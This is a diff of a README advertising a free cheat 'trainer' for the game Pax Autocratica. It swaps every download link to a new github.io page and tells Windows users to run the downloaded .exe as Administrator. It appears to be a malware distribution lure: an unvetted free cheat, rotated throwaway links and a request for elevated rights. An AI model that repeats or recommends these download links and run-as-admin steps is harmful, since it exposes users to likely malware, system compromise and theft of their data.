@@ -2,9 +2,9 @@
 
 Pax Autocratica trainer: infinite treasury, instant army build — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://spearsurvive.github.io/win/)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
 ---
 
@@ -31,7 +31,7 @@ Pax Autocratica stays in the top trainer searches — infinite treasury, instant
 
 ### 🪟 Windows
 
-1. Download the latest build 👉 [Download Trainer](https://spearsurvive.github.io/win/)
+1. Download the latest build 👉 [Download Trainer](https://zenboulderagora.github.io/Windw/)
 2. Extract and run the `.exe` as Administrator.
 3. Launch Pax Autocratica and load your save.
 4. Press **F1** to open the menu — toggle what you need. Done ✅
